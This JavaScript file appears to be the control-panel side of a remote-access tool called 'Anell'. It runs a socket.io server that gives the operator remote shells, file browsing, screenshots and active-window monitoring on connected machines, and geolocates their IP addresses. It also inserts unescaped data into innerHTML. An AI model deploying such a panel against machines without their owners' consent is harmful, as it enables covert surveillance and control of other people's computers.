function status(gv)
{

_("status").innerHTML = gv;

}


function check_auth(uuid)
{


for(i = 0; i < configon.config.length; i++ )
{

if(uuid == configon.config[i].uuid_pc.os)
{

    return i;
}
}

return false;



}

function check_auth_id(socketid)
{


for(i = 0; i < configon.config.length; i++ )
{

if(socketid == configon.config[i].socket_id)
{

    return i;
}





}
return false;


}



function configaddclient (config)
{
 
configon.config.push(config);
console.log(configon)



}

function configupdate()
{
if(fs.existsSync(cf)) fs.unlinkSync(cf);

fs.writeFileSync(cf, JSON.stringify(configon));

}




async function network()
{









}
async function ip_info()
{



}

async function client_count()
{


    sockets = Array.from(io.sockets.sockets).map(socket => socket[0]);
_("client_count").innerHTML = "Nombre de clients : " + sockets.length



}

async function home()
{



resp = await request(dist_url);
resp = JSON.parse(resp);
select_btn("homebtn_div");
_("tb_dashboard").innerHTML = `<h1 class="home_title" >Anell Home</h1>`
_("tb_dashboard").innerHTML += `<h2>News</h2>`;
for(i = 0; i < resp.news.length; i++) 
{

_("tb_dashboard").innerHTML += "<h4>" + resp.news[i].name + "</h4>"
_("tb_dashboard").innerHTML += "<p>" + resp.news[i].content + "</p>"

}
    







}

function request (url)
{
return new Promise((resolve, reject) => {
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
       resolve(this.responseText);
      }
    };
    xmlhttp.open("GET", url,true);
    xmlhttp.send();

})
}

async function render_array()
{

    status("[INFO] Render array")
    sockets = Array.from(io.sockets.sockets).map(socket => socket[0]);

    closexterm();
    toadd = '<table style="width: 100%;">';
    toadd += '<tr><td>Hostname</td><td>Ip location</td><td>Active window</td><td>ip Socket</td><td>Stop client</td><td>Uptime</td><td>See more</td></tr>';

for(e = 0; e < sockets.length && check_auth_id(sockets[e]) !== false; e++) 
{

    id = sockets[e];


    checkauthindex = check_auth_id(id);
    ip = Object.fromEntries(io.sockets.sockets)[id].client.conn.remoteAddress
    if(isLocal(ip))
    {
        imagesrc = "assets/img/local.svg";
    }else
    {

                    //    Jamais les URL en dur. Dans une variable.... !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

        response = await request("https://ipapi.co/" + ip.substr(7) + "/json/");
        response = JSON.parse(response);
        configon.config[checkauthindex].ip_info = response;
    
        configupdate();
        imagesrc = "assets/img/" + response.country_code + ".svg";
    }

xtemr = `<button onclick="createxterm('${id}')">Xterm</button>`;

    if(typeof(checkauth) == 'boolean')
    {
        info = "Must me auth to get info"
        authedd = "false";


    }else
    { 
        authedd = "true";
        info = `<button onclick="more_system_info('${checkauthindex}')">Info</button>`;


    }


 


 toadd += `<tr><td>${configon.config[checkauthindex].static.os.fqdn}</td><td><img width="32" height="32"  src="${imagesrc}"></td><td style="max-width: 50px;"><p style="max-width: 50px;" >${configon.config[checkauthindex].dynamic.activewin.title}</p></td><td>${ip}</td><td><button onclick="stopclient('${id}')">Stop client</button></td><td>Uptime connect</td><td><button onclick='more("${id}")'>More</button></td></tr>`;


}
// console.log(toadd)
_("tb_dashboard").innerHTML = toadd + "</table>"
}
function more(id)
{
    selected_btn = "more";
    checkauthindex = check_auth_id(id);
t = configon.config[checkauthindex];
_("tb_dashboard").innerHTML = `
<h2 style="text-align:center;">Information About ${id}</h2>
<h3>Client Platform : ${t.static.os.distro}</h3>
<h3>Action</h3>
<h4>On pc </h4>
Reboot <br>
Shutdown <br>
Log out <br>

<h3>On Script</h3>
<button onclick="stopclient('${id}')">Stop</button> <br>
<button onclick="uninstallclient('${id}')">Uninstall</button> <br>
<button onclick="restart_client_from_host('${id}')">Reconnect</button> <br>
<button onclick="killmw('${id}')">Kill main window</button> <br>


<h3>Tool</h3>

<button onclick="createxterm('${id}')">Xterm Console</button> <br>
<button onclick="createexplorer('${id}')">File explorer</button><br>
<button onclick="emitscren('${id}')">Screenshot</button><br>

`




}

function createexplorer(id)
{
 selected_btn = "explorer_" + id;   
allow_explore = id;
    index = check_auth_id(id)
    document.getElementsByClassName("title-second-button-left-body")[0].innerHTML = document.getElementsByClassName("title-second-button-left-body")[0].innerHTML.replace("Clients", "Retour");

    _("clientbtn_div").addEventListener("click", () => {
    
        more(id);
    document.getElementsByClassName("title-second-button-left-body")[0].innerHTML = document.getElementsByClassName("title-second-button-left-body")[0].innerHTML.replace("Retour", "Clients");
        sethandle();
    })
if(configon.config[index].static.os.platform.includes("Windows"))
{
    main = "C:/";
}else
{
    main = "/";
}

_("tb_dashboard").innerHTML = `<center>Path : <input  type="text" value="${main}"id="file_path_ts"><button onclick="nav()">Browse</button><br><div style="display: inline-block; border: 4px solid black; width: 100%; height: 90%;" id="manager" class="manager"></div></center>`




}

function link_browse(event, path, file)
{
    event.preventDefault();

_("file_path_ts").value = path  +  file;
nav();



}
function nav()
{
tonav = _("file_path_ts").value;
console.log("Browsing : " + tonav);
id = allow_explore;


io.to(id).emit("explore", tonav);


}







function uninstallclient(id)
{



}

function staticinfo(id)
{
    checkauthindex = check_auth_id(id);
    t = configon.config[checkauthindex].static;
    _("tb_dashboard").innerHTML = 
    `
    <h1 style="text-align:center;">Information about ${id}</h1>
    <h2>Static information</h2>
    <h3>System : </h3>
    Version : ${t.system.version}<br>
    Constructeur : ${t.system.manufacturer}<br>
    Model : ${t.system.model}<br>
    Serie : ${t.system.serial}<br>
    UUID : ${t.system.uuid}<br>
    SKU : ${t.system.sku}<br>
    Virtuel : ${t.system.virtual}<br>
    <h3>Bios : </h3>
    Vendeur : ${t.bios.vendor}<br>
    Version : ${t.bios.version}<br>
    Release Date : ${t.bios.releaseDate}<br>
    Revision : ${t.bios.revision}<br>
    Serie : ${t.bios.serial}<br>
    <h3> MotherBoard :</h3>
    Vendeur : ${t.bios.vendor}<br>`;
}

function getuptimemachine()
{
    uptimemachine = Number(configon.config[checkauthindex].dynamic.machineuptime).toFixed(1); 
    if(uptimemachine !== "NaN"){
    if(uptimemachine < 3600){
        uptimemachine = uptimemachine / 60 ;
        uptimemachine = Math.round(uptimemachine) + " Minutes";
        }else{
            uptimemachine = uptimemachine / 3600 ;
            uptimemachine = Math.round(uptimemachine) + " Heures";
        
        }
    }else{

        uptimemachine = "<30sec";
        
    }
return uptimemachine;
}
function getuptimescript(id)
{
    checkauthindex = check_auth_id(id);
    uptimescript = Number(configon.config[checkauthindex].dynamic.scriptuptime).toFixed(1); 
if(uptimescript !== "NaN"){
if(uptimescript < 3600){
    uptimescript = uptimescript / 60 ;
    uptimescript = Math.round(uptimescript) + " Minutes";
    }else{
        uptimescript = uptimescript / 3600 ;
        uptimescript = Math.round(uptimescript) + " Heures";
    
    }
return uptimescript;
}else
{
    return '<30sec';
}

}
function more_system_info(index)
{
    selected_btn = "systeminfo";
_("tb_dashboard").innerHTML = '<h1>Info system</h1>';
_("tb_dashboard").innerHTML += JSON.stringify(configon.config[i].static);

}
async function more_ip_info(index, refresh)
{

    ip = Object.fromEntries(io.sockets.sockets)[configon.config[index].socket_id].client.conn.remoteAddress
if(isLocal(ip))
{

_("tb_dashboard").innerHTML = `<h1>${ip} is an Ip local</h1>`;
_("tb_dashboard").innerHTML += `<button onclick="more_ip_info(${checkauthindex}, true)">Refresh</button><br>
<button onclick="document.getElementById('clientbtn_div').click();">Back</button>`
}else{

    
        response = await request("http://ip-api.com/json/" + ip.substr(7));
        response = JSON.parse(response);
        configon.config[checkauthindex].ip_info = response;
       configupdate();

selected_btn = "ipinfo"
inf = configon.config[checkauthindex].ip_info
_("tb_dashboard").innerHTML = `
<h1>Ip info </h1> <br>
<h2 class="ip-info-title" >Status de la requete : ${inf.status}</h2>
<h2 class="ip-info-title">Pays : ${inf.contry}</h2>
<h2 class="ip-info-title" >Code du pays : ${inf.countryCode}</h2>
<h2 class="ip-info-title">Code de la région : ${inf.region}</h2>
<h2 class="ip-info-title">Région: ${inf.regionName}</h2>
<h2 class="ip-info-title">Ville: ${inf.city}</h2>
<h2 class="ip-info-title">Code postal: ${inf.zip}</h2>
<h2 class="ip-info-title">Lattitude : ${inf.lat}</h2>
<h2 class="ip-info-title">Longitude : ${inf.lon}</h2>
<h2 class="ip-info-title" >Région Horaire : ${inf.timezone}</h2>
<h2 class="ip-info-title">ISP : ${inf.isp}</h2>
<h2 class="ip-info-title">Organistation : ${inf.org}</h2>
<h2 class="ip-info-title">ASN : ${inf.as}</h2>
<button onclick="more_ip_info(${checkauthindex}, true)">Refresh</button><br>
<button onclick="document.getElementById('clientbtn_div').click();">Back</button>
`



}
}

function killmw (sid)
{
setTimeout(function (){
    io.to(sid).emit("close-active-win");
caw = sid;
}, 2000)


}

function restart_client_from_host(socketid)
{

io.to(socketid).emit("restart-client");
console.log(socketid)

}

function stopclient (id){


io.to(id).emit("stop-client");

}

function emitscren(sid)
{
    authorizedscrensocketid = sid;
io.to(sid).emit("screenshot-desktop");

}



function createxterm(id)
{
document.getElementsByClassName("title-second-button-left-body")[0].innerHTML = document.getElementsByClassName("title-second-button-left-body")[0].innerHTML.replace("Clients", "Retour");

_("clientbtn_div").addEventListener("click", () => {

    more(id);
document.getElementsByClassName("title-second-button-left-body")[0].innerHTML = document.getElementsByClassName("title-second-button-left-body")[0].innerHTML.replace("Retour", "Clients");
    sethandle();
})
    isxterm = true;
    _("tb_dashboard").innerHTML = "";
    activexterm = id;
term = new Terminal({cols : 130, rows : 31});    
term.open(_("tb_dashboard"));
selected_btn = "xterm";
term.onData(e => {

    io.to(id).emit("xterm-input", e);

})



}


function downloadfile(path, file)
{
if(confirm("Are you sure you want to download"))
{
console.log("Downloading " + path + file);


}else
{

    console.log("Download abording");
}

}

function closexterm(id)
{
    isxterm = false;
    io.to(id, "close-xterm");
}

function getindex (osuuid)
{
    for(i = 0; i < configon.config.length; i++)
{
    if(configon.config[i].uuid_pc.os == osuuid)
    {
index = i;
return index;

    }



}
}
function updatesocketid(osuuid, socketid)
{
    for(i = 0; i < configon.config.length; i++)
{
    if(configon.config[i].uuid_pc.os == osuuid)
    {
        configon.config[i].socket_id = socketid;
index = "found"

    }



}

if(typeof(index) == 'undefined')
{

throw new Error('Cannot find the socket with the uuid ' + osuuid);
}






}


function stopserver()
{

    io.close();
  if(selected_btn == "clientbtn_div") render_array();
    _("server-ss").innerHTML = "Lancer le serveur";
    _("server-ss").onclick = startserver;
}
function startserver()
{
io.listen(port);
    console.log("Start server");
    _("server-ss").onclick = document.location.href = "";
    _("server-ss").innerHTML = "Stop server"
}



function infoshow()
{
_("tb_dashboard").innerHTML = 
`
<h1>Info</h1>
<h2>Version : ${pjson.version}</h2>
<h2>Nodejs Version : ${process.version}</h2>


`;























}